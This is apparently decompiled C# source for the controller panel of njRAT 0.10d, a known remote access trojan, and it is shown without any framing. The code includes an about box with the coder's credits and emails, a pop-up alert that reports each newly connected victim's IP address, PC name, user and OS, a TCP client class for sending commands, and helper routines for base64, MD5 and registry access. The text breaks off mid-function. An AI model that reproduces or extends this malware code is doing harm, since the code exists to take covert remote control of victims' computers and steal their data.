			this.Label25.TabIndex = 28;
			this.Label25.Text = "Remote Administration Tool";
			this.Label26.AutoSize = true;
			this.Label26.BackColor = Color.Transparent;
			this.Label26.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label26.ForeColor = Color.White;
			Control arg_1746_0 = this.Label26;
			location = new Point(1017, 226);
			arg_1746_0.Location = location;
			Control arg_1760_0 = this.Label26;
			margin = new Padding(5, 0, 5, 0);
			arg_1760_0.Margin = margin;
			this.Label26.Name = "Label26";
			Control arg_178B_0 = this.Label26;
			size = new Size(56, 13);
			arg_178B_0.Size = size;
			this.Label26.TabIndex = 27;
			this.Label26.Text = "Function:";
			this.Label27.AutoSize = true;
			this.Label27.BackColor = Color.Transparent;
			this.Label27.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label27.ForeColor = Color.CornflowerBlue;
			Control arg_1816_0 = this.Label27;
			location = new Point(1145, 264);
			arg_1816_0.Location = location;
			Control arg_1830_0 = this.Label27;
			margin = new Padding(5, 0, 5, 0);
			arg_1830_0.Margin = margin;
			this.Label27.Name = "Label27";
			Control arg_185B_0 = this.Label27;
			size = new Size(96, 13);
			arg_185B_0.Size = size;
			this.Label27.TabIndex = 30;
			this.Label27.Text = "Net Framework 2";
			this.Label28.AutoSize = true;
			this.Label28.BackColor = Color.Transparent;
			this.Label28.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label28.ForeColor = Color.White;
			Control arg_18E6_0 = this.Label28;
			location = new Point(1013, 264);
			arg_18E6_0.Location = location;
			Control arg_1900_0 = this.Label28;
			margin = new Padding(5, 0, 5, 0);
			arg_1900_0.Margin = margin;
			this.Label28.Name = "Label28";
			Control arg_192B_0 = this.Label28;
			size = new Size(76, 13);
			arg_192B_0.Size = size;
			this.Label28.TabIndex = 29;
			this.Label28.Text = "Recomonded";
			this.Timer2.Enabled = true;
			this.Timer2.Interval = 60;
			this.LinkLabel1.ActiveLinkColor = Color.Lime;
			this.LinkLabel1.AutoSize = true;
			this.LinkLabel1.Font = new Font("Tahoma", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LinkLabel1.LinkColor = Color.LightSteelBlue;
			Control arg_19CD_0 = this.LinkLabel1;
			location = new Point(210, 1);
			arg_19CD_0.Location = location;
			Control arg_19E7_0 = this.LinkLabel1;
			margin = new Padding(5, 0, 5, 0);
			arg_19E7_0.Margin = margin;
			this.LinkLabel1.Name = "LinkLabel1";
			Control arg_1A18_0 = this.LinkLabel1;
			size = new Size(260, 144);
			arg_1A18_0.Size = size;
			this.LinkLabel1.TabIndex = 33;
			this.LinkLabel1.TabStop = true;
			this.LinkLabel1.Text = "\r\nnj RAT\r\nVerison   : 0.10d\r\nProgram :  Mr.Naseer 2012\r\nLanguage: VB NET 2010\r\nEmail      : hackr.xtri_n@yahoo.com\r\nEmail      : naseerabd319@yahoo.com\r\ncoded by : NjQ9";
			this.WaterFX1.BackColor = Color.Transparent;
			this.WaterFX1.ImageBitmap = (Bitmap)componentResourceManager.GetObject("WaterFX1.ImageBitmap");
			Control arg_1A89_0 = this.WaterFX1;
			location = new Point(-2, 1);
			arg_1A89_0.Location = location;
			this.WaterFX1.Name = "WaterFX1";
			this.WaterFX1.Scale = 1;
			Control arg_1AC7_0 = this.WaterFX1;
			size = new Size(204, 152);
			arg_1AC7_0.Size = size;
			this.WaterFX1.TabIndex = 34;
			SizeF autoScaleDimensions = new SizeF(10f, 23f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			this.BackgroundImageLayout = ImageLayout.Stretch;
			size = new Size(469, 153);
			this.ClientSize = size;
			this.Controls.Add(this.WaterFX1);
			this.Controls.Add(this.LinkLabel1);
			this.Controls.Add(this.Label27);
			this.Controls.Add(this.Label28);
			this.Controls.Add(this.Label25);
			this.Controls.Add(this.Label26);
			this.Controls.Add(this.Label24);
			this.Controls.Add(this.PictureBox2);
			this.Controls.Add(this.Label23);
			this.Controls.Add(this.Label22);
			this.Controls.Add(this.Label21);
			this.Controls.Add(this.Label20);
			this.Controls.Add(this.Label18);
			this.Controls.Add(this.Label19);
			this.Controls.Add(this.Label16);
			this.Controls.Add(this.Label17);
			this.Controls.Add(this.Label15);
			this.Controls.Add(this.Label14);
			this.Controls.Add(this.Label13);
			this.Controls.Add(this.Label11);
			this.Controls.Add(this.Label12);
			this.Controls.Add(this.Label10);
			this.Controls.Add(this.Label9);
			this.Controls.Add(this.Label8);
			this.Controls.Add(this.Label7);
			this.Controls.Add(this.Label6);
			this.Controls.Add(this.Label5);
			this.Controls.Add(this.Label4);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.PictureBox1);
			this.Cursor = Cursors.Cross;
			this.DoubleBuffered = true;
			this.Font = new Font("Tahoma", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.ForeColor = SystemColors.ButtonHighlight;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			margin = new Padding(5);
			this.Margin = margin;
			size = new Size(485, 187);
			this.MaximumSize = size;
			size = new Size(485, 187);
			this.MinimumSize = size;
			this.Name = "About_Coder";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "About ";
			this.TopMost = true;
			((ISupportInitialize)this.PictureBox2).EndInit();
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Label16_Click(object sender, EventArgs e)
		{
		}

		private void Coder_FormClosing(object sender, FormClosingEventArgs e)
		{
			MyProject.Computer.Audio.Stop();
		}

		private void Coder_Load(object sender, EventArgs e)
		{
			this.Timer1.Start();
			this.Text = "About: " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_44)
			{
				ProjectData.SetProjectError(expr_44);
				ProjectData.ClearProjectError();
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			LinkLabel linkLabel = this.LinkLabel1;
			checked
			{
				linkLabel.Top -= 2;
				bool flag = this.LinkLabel1.Bottom <= this.ClientRectangle.Top;
				if (flag)
				{
					this.LinkLabel1.Top = this.ClientRectangle.Bottom;
				}
			}
		}

		private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			this.Timer2.Enabled = false;
		}

		private void About_Coder_MouseLeave(object sender, EventArgs e)
		{
			this.Timer2.Enabled = true;
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class alrt : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader _ColumnHeader6;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("pc")]
		private Label _pc;

		[AccessedThroughProperty("user")]
		private Label _user;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		[AccessedThroughProperty("L1")]
		private ListView _L1;

		private int x;

		private int y;

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader6 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Label pc
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pc;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pc = value;
			}
		}

		internal virtual Label user
		{
			[DebuggerNonUserCode]
			get
			{
				return this._user;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._user = value;
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		internal virtual ListView L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._L1 = value;
			}
		}

		[DebuggerNonUserCode]
		public alrt()
		{
			base.Load += new EventHandler(this.alrt_Load);
			alrt.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = alrt.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = alrt.__ENCList.Count == alrt.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = alrt.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = alrt.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									alrt.__ENCList[num] = alrt.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						alrt.__ENCList.RemoveRange(num, alrt.__ENCList.Count - num);
						alrt.__ENCList.Capacity = alrt.__ENCList.Count;
					}
					alrt.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader3 = new ColumnHeader();
			this.ColumnHeader4 = new ColumnHeader();
			this.ColumnHeader5 = new ColumnHeader();
			this.ColumnHeader6 = new ColumnHeader();
			this.PictureBox1 = new PictureBox();
			this.Label1 = new Label();
			this.pc = new Label();
			this.user = new Label();
			this.Label2 = new Label();
			this.Timer1 = new Timer(this.components);
			this.Label3 = new Label();
			this.Label4 = new Label();
			this.Label5 = new Label();
			this.Label6 = new Label();
			this.Label7 = new Label();
			this.L1 = new ListView();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.ColumnHeader1.Text = "";
			this.ColumnHeader2.Text = "";
			this.ColumnHeader3.Text = "";
			this.ColumnHeader4.Text = "";
			this.ColumnHeader5.Text = "";
			this.ColumnHeader6.Text = "";
			this.PictureBox1.BorderStyle = BorderStyle.FixedSingle;
			Control arg_181_0 = this.PictureBox1;
			Point location = new Point(4, 3);
			arg_181_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_1AB_0 = this.PictureBox1;
			Size size = new Size(73, 36);
			arg_1AB_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
			this.PictureBox1.TabIndex = 3;
			this.PictureBox1.TabStop = false;
			this.Label1.AutoSize = true;
			this.Label1.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.Lime;
			Control arg_227_0 = this.Label1;
			location = new Point(83, 14);
			arg_227_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_251_0 = this.Label1;
			size = new Size(55, 20);
			arg_251_0.Size = size;
			this.Label1.TabIndex = 4;
			this.Label1.Text = "Label1";
			this.pc.AutoSize = true;
			this.pc.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.pc.ForeColor = Color.Yellow;
			Control arg_2C4_0 = this.pc;
			location = new Point(9, 76);
			arg_2C4_0.Location = location;
			this.pc.Name = "pc";
			Control arg_2EE_0 = this.pc;
			size = new Size(31, 20);
			arg_2EE_0.Size = size;
			this.pc.TabIndex = 5;
			this.pc.Text = "PC:";
			this.user.AutoSize = true;
			this.user.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.user.ForeColor = Color.Yellow;
			Control arg_360_0 = this.user;
			location = new Point(7, 100);
			arg_360_0.Location = location;
			this.user.Name = "user";
			Control arg_38A_0 = this.user;
			size = new Size(45, 20);
			arg_38A_0.Size = size;
			this.user.TabIndex = 6;
			this.user.Text = "User:";
			this.Label2.AutoSize = true;
			this.Label2.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label2.ForeColor = Color.Yellow;
			Control arg_400_0 = this.Label2;
			location = new Point(9, 128);
			arg_400_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_42A_0 = this.Label2;
			size = new Size(32, 20);
			arg_42A_0.Size = size;
			this.Label2.TabIndex = 7;
			this.Label2.Text = "OS:";
			this.Timer1.Enabled = true;
			this.Timer1.Interval = 5000;
			this.Label3.AutoSize = true;
			this.Label3.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.Yellow;
			Control arg_4BB_0 = this.Label3;
			location = new Point(13, 48);
			arg_4BB_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_4E5_0 = this.Label3;
			size = new Size(27, 20);
			arg_4E5_0.Size = size;
			this.Label3.TabIndex = 8;
			this.Label3.Text = "IP:";
			this.Label4.AutoSize = true;
			this.Label4.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label4.ForeColor = Color.Yellow;
			Control arg_558_0 = this.Label4;
			location = new Point(46, 48);
			arg_558_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_582_0 = this.Label4;
			size = new Size(55, 20);
			arg_582_0.Size = size;
			this.Label4.TabIndex = 9;
			this.Label4.Text = "Label4";
			this.Label5.AutoSize = true;
			this.Label5.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label5.ForeColor = Color.Yellow;
			Control arg_5F6_0 = this.Label5;
			location = new Point(46, 76);
			arg_5F6_0.Location = location;
			this.Label5.Name = "Label5";
			Control arg_620_0 = this.Label5;
			size = new Size(55, 20);
			arg_620_0.Size = size;
			this.Label5.TabIndex = 10;
			this.Label5.Text = "Label5";
			this.Label6.AutoSize = true;
			this.Label6.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label6.ForeColor = Color.Yellow;
			Control arg_694_0 = this.Label6;
			location = new Point(58, 100);
			arg_694_0.Location = location;
			this.Label6.Name = "Label6";
			Control arg_6BE_0 = this.Label6;
			size = new Size(55, 20);
			arg_6BE_0.Size = size;
			this.Label6.TabIndex = 11;
			this.Label6.Text = "Label6";
			this.Label7.AutoSize = true;
			this.Label7.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label7.ForeColor = Color.Yellow;
			Control arg_735_0 = this.Label7;
			location = new Point(47, 128);
			arg_735_0.Location = location;
			this.Label7.Name = "Label7";
			Control arg_75F_0 = this.Label7;
			size = new Size(55, 20);
			arg_75F_0.Size = size;
			this.Label7.TabIndex = 12;
			this.Label7.Text = "Label7";
			this.L1.BackColor = Color.Black;
			this.L1.BorderStyle = BorderStyle.None;
			this.L1.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.L1.ForeColor = Color.Yellow;
			Control arg_7E3_0 = this.L1;
			location = new Point(2, 45);
			arg_7E3_0.Location = location;
			this.L1.Name = "L1";
			Control arg_810_0 = this.L1;
			size = new Size(323, 109);
			arg_810_0.Size = size;
			this.L1.TabIndex = 13;
			this.L1.UseCompatibleStateImageBehavior = false;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(273, 143);
			this.ClientSize = size;
			this.Controls.Add(this.L1);
			this.Controls.Add(this.Label7);
			this.Controls.Add(this.Label6);
			this.Controls.Add(this.Label5);
			this.Controls.Add(this.Label4);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.user);
			this.Controls.Add(this.pc);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.PictureBox1);
			this.FormBorderStyle = FormBorderStyle.None;
			this.Name = "alrt";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.Text = "alrt";
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public void shw()
		{
			checked
			{
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width;
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Height;
				this.Timer1.Enabled = true;
			}
		}

		private void alrt_Load(object sender, EventArgs e)
		{
			this.x = checked(Screen.PrimaryScreen.WorkingArea.Width - this.Width);
			this.y = Screen.PrimaryScreen.WorkingArea.Height;
			Point location = new Point(this.x, this.y);
			this.Location = location;
			this.TopMost = true;
			this.Timer1.Start();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class Client
	{
		private delegate void _INV();

		private Timer _T;

		public bool Buzy;

		public TcpClient Client;

		public bool CN;

		public string Folder;

		public bool Isend;

		public bool IsPNGED;

		public bool IsUSB;

		public ListViewItem L;

		public int lp;

		public MemoryStream M;

		private string oip;

		public Bitmap pc;

		public int Ping;

		public List<string> plg;

		public string[] snf;

		public string SPL;

		public virtual Timer T
		{
			get
			{
				return this._T;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T_Tick);
				bool flag = this._T != null;
				if (flag)
				{
					this._T.Tick -= value2;
				}
				this._T = value;
				flag = (this._T != null);
				if (flag)
				{
					this._T.Tick += value2;
				}
			}
		}

		public Client(TcpClient c)
		{
			this.Buzy = false;
			this.CN = true;
			this.Isend = false;
			this.IsPNGED = false;
			this.IsUSB = false;
			this.lp = 0;
			this.M = new MemoryStream();
			this.oip = "";
			this.pc = null;
			this.Ping = 0;
			this.plg = new List<string>();
			this.snf = null;
			this.SPL = "[endof]";
			this.Client = c;
			sokserver.F.Invoke(new Client._INV(this.inv));
		}

		private void inv()
		{
			this.T = new Timer
			{
				Interval = 1,
				Enabled = true
			};
		}

		public string ip()
		{
			bool flag = this.oip.Length <= 0;
			if (flag)
			{
				try
				{
					this.oip = this.Client.Client.RemoteEndPoint.ToString();
				}
				catch (Exception expr_36)
				{
					ProjectData.SetProjectError(expr_36);
					Exception projectError = expr_36;
					ProjectData.SetProjectError(projectError);
					this.oip = this.GetHashCode().ToString();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			return this.oip;
		}

		public bool Send(byte[] b)
		{
			bool flag = !this.CN;
			checked
			{
				bool result;
				if (flag)
				{
					result = false;
				}
				else
				{
					bool flag2;
					try
					{
						Socket client = this.Client.Client;
						Socket obj = client;
						lock (obj)
						{
							MemoryStream memoryStream = new MemoryStream();
							memoryStream.Write(b, 0, b.Length);
							memoryStream.Write(FN.SB(ref this.SPL), 0, this.SPL.Length);
							this.Client.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
							sokserver.SNT += (int)memoryStream.Length;
							memoryStream.Dispose();
						}
						flag2 = true;
					}
					catch (Exception expr_AB)
					{
						ProjectData.SetProjectError(expr_AB);
						Exception projectError = expr_AB;
						ProjectData.SetProjectError(projectError);
						this.CN = false;
						flag2 = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					result = flag2;
				}
				return result;
			}
		}

		public bool Send(string S)
		{
			return this.Send(FN.SB(ref S));
		}

		public void SendNoWait(byte[] b)
		{
			this.Send(b);
		}

		private void T_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.Ping++;
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Windows.Forms;

namespace nj
{
	public class clsListviewSorter : IComparer
	{
		private int m_ColumnNumber;

		private SortOrder m_SortOrder;

		public clsListviewSorter(int column_number, SortOrder sort_order)
		{
			this.m_ColumnNumber = column_number;
			this.m_SortOrder = sort_order;
		}

		public int Compare(object x, object y)
		{
			ListViewItem listViewItem = (ListViewItem)x;
			ListViewItem listViewItem2 = (ListViewItem)y;
			bool flag = listViewItem.SubItems.Count <= this.m_ColumnNumber;
			string text;
			if (flag)
			{
				text = "";
			}
			else
			{
				text = listViewItem.SubItems[this.m_ColumnNumber].Text;
			}
			flag = (listViewItem2.SubItems.Count <= this.m_ColumnNumber);
			string text2;
			if (flag)
			{
				text2 = "";
			}
			else
			{
				text2 = listViewItem2.SubItems[this.m_ColumnNumber].Text;
			}
			flag = (this.m_SortOrder == SortOrder.Ascending);
			int result;
			if (flag)
			{
				bool flag2 = Versioned.IsNumeric(text) & Versioned.IsNumeric(text2);
				if (flag2)
				{
					result = Conversion.Val(text).CompareTo(Conversion.Val(text2));
				}
				else
				{
					flag2 = (Information.IsDate(text) & Information.IsDate(text2));
					if (flag2)
					{
						result = DateTime.Parse(text).CompareTo(DateTime.Parse(text2));
					}
					else
					{
						result = string.Compare(text, text2);
					}
				}
			}
			else
			{
				bool flag2 = Versioned.IsNumeric(text) & Versioned.IsNumeric(text2);
				if (flag2)
				{
					result = Conversion.Val(text2).CompareTo(Conversion.Val(text));
				}
				else
				{
					flag2 = (Information.IsDate(text) & Information.IsDate(text2));
					if (flag2)
					{
						result = DateTime.Parse(text2).CompareTo(DateTime.Parse(text));
					}
					else
					{
						result = string.Compare(text2, text);
					}
				}
			}
			return result;
		}
	}
}

using System;
using System.Collections.Generic;

namespace nj
{
	public class FMcach
	{
		public List<string> files;

		public List<string> folders;

		public string Path;

		public FMcach()
		{
			this.files = new List<string>();
			this.folders = new List<string>();
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace nj
{
	public class FN
	{
		[DebuggerNonUserCode]
		public FN()
		{
		}

		public static string BS(ref byte[] B)
		{
			return Encoding.Default.GetString(B);
		}

		public static string DEB(ref string s)
		{
			int num = 0;
			checked
			{
				string result;
				while (true)
				{
					try
					{
						byte[] bytes = Convert.FromBase64String(s);
						result = Encoding.UTF8.GetString(bytes);
					}
					catch (Exception expr_1C)
					{
						ProjectData.SetProjectError(expr_1C);
						Exception projectError = expr_1C;
						ProjectData.SetProjectError(projectError);
						num++;
						bool flag = num == 3;
						if (!flag)
						{
							s += "=";
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							continue;
						}
						result = null;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					break;
				}
				return result;
			}
		}

		public static string ENB(ref string s)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		}

		public static byte[] FDE(string base64)
		{
			return Convert.FromBase64String(base64);
		}

		public static string FEN(byte[] data)
		{
			return Convert.ToBase64String(data);
		}

		public static Array fx(byte[] b, string WRD)
		{
			List<byte[]> list = new List<byte[]>();
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2 = new MemoryStream();
			string[] array = Strings.Split(FN.BS(ref b), WRD, -1, CompareMethod.Binary);
			memoryStream.Write(b, 0, array[0].Length);
			checked
			{
				memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
				list.Add(memoryStream.ToArray());
				list.Add(memoryStream2.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				return list.ToArray();
			}
		}

		public static string getMD5Hash(string s)
		{
			return FN.getMD5Hash(FN.SB(ref s));
		}

		public static string getMD5Hash(byte[] B)
		{
			B = new MD5CryptoServiceProvider().ComputeHash(B);
			string text = "";
			byte[] array = B;
			checked
			{
				for (int i = 0; i < array.Length; i++)
				{
					byte b = array[i];
					text += b.ToString("x2");
				}
				return text;
			}
		}

		public static Form GFORM(string Name)
		{
			return Application.OpenForms[Name];
		}

		public static string GTV(string Name, string df)
		{
			string result;
			try
			{
				result = Conversions.ToString(RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("Software\\" + sokserver.vr).GetValue(Name, df)));
			}
			catch (Exception expr_2F)
			{
				ProjectData.SetProjectError(expr_2F);
				Exception projectError = expr_2F;
				ProjectData.SetProjectError(projectError);
				result = df;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static string HM()
		{
			return string.Concat(new string[]
			{
				"[",
				Conversions.ToString(DateAndTime.TimeOfDay.Hour),
				":",
				Conversions.ToString(DateAndTime.TimeOfDay.Minute),
				":",
				Conversions.ToString(DateAndTime.TimeOfDay.Second),
				"] "
